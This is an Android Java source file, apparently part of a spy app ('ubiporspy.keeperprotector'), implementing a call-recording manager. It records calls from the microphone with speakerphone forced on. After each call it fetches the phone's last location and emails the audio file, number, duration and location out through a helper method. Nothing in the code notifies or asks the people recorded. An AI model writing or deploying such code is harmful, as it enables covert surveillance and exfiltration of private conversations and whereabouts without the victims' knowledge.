package com.ubiporspy.keeperprotector.manager;

import android.content.Context;
import android.location.Location;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.CountDownTimer;
import android.os.Environment;
import android.util.Log;

import com.ubiporspy.keeperprotector.util.Data;
import com.ubiporspy.keeperprotector.util.LocationManager;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Locale;

/**
 * Clase principal para grabar una llamada.
 */
public class CallRecorderManager implements LocationManager.OnLocationManagerInterface {

    private long onStarted = 0;
    private long onFinished = 0;

    private static final String AUDIO_RECORDER_FILE_EXT_3GP = ".3gp";
    private static final String AUDIO_RECORDER_FOLDER = "AudioRecorder";

    private MediaRecorder recorder = null;
    private int output_format = MediaRecorder.OutputFormat.THREE_GPP;
    private String file_ext = AUDIO_RECORDER_FILE_EXT_3GP;

    private final Context context;
    private final String number;

    private AudioManager audioManager;
    private String filePath;

    public CallRecorderManager(Context context, String number) {
        this.context = context;
        this.number = number;

        audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        audioManager.setMode(AudioManager.MODE_IN_CALL);
        audioManager.setSpeakerphoneOn(true);
    }

    public void startRecording() {
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(output_format);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(getFilename());
        recorder.setOnErrorListener(errorListener);
        recorder.setOnInfoListener(infoListener);

        try {
            recorder.prepare();
            recorder.start();

            onStarted = System.currentTimeMillis();

            Log.d("MainService", "Call record started successful");
        } catch (IllegalStateException e) {
            Log.e(this.getClass().getSimpleName(), "Error al grabar: " + e.getMessage());
        } catch (IOException e) {
            Log.e(this.getClass().getSimpleName(), "Error al grabar: " + e.getMessage());
        }
    }

    public void stopRecording() {
        audioManager.setSpeakerphoneOn(false);

        try {
            if (null != recorder) {
                recorder.stop();

                onFinished = System.currentTimeMillis();

                recorder.reset();
                recorder.release();

                recorder = null;

                Log.d("MainService", "Call record finished successful");

                LocationManager.getLastLocation(
                        context,
                        CallRecorderManager.this);
            } else {
                forceDeletingFile();
            }
        } catch (RuntimeException e) {
            Log.e(this.getClass().getSimpleName(), "Error al detener: " + e.getMessage());

            forceDeletingFile();
        }
    }

    private void forceDeletingFile() {
        onStarted = 0;
        onFinished = 0;

        File file = new File(filePath);
        file.delete();
        filePath = null;
    }

    private String getFilename() {
        String filepath = Environment.getExternalStorageDirectory().getPath();
        File file = new File(filepath, AUDIO_RECORDER_FOLDER);

        if (!file.exists()) {
            file.mkdirs();
        }

        long now = System.currentTimeMillis();
        SimpleDateFormat format = new SimpleDateFormat("dd_mm_yyy_hh_MM", Locale.getDefault());
        String name = format.format(now);

        this.filePath = file.getAbsolutePath() + "/" + name + file_ext;
        return this.filePath;
    }

    private MediaRecorder.OnErrorListener errorListener = new MediaRecorder.OnErrorListener() {
        @Override
        public void onError(MediaRecorder mr, int what, int extra) {
            Log.e(this.getClass().getSimpleName(), "Error al grabar: " + what);
        }
    };

    private MediaRecorder.OnInfoListener infoListener = new MediaRecorder.OnInfoListener() {
        @Override
        public void onInfo(MediaRecorder mr, int what, int extra) {
            Log.e(this.getClass().getSimpleName(), "Atención al grabar: " + what);
        }
    };

    @Override
    public void onLocationResult(Location location) {
        File file = new File(filePath);

        Log.d("MainService", "Call record email start sending successful");

        Data.sendEmailWithCallLogAttachment(context, location, file,
                onFinished - onStarted, number, onFinished);

        filePath = null;
    }
}
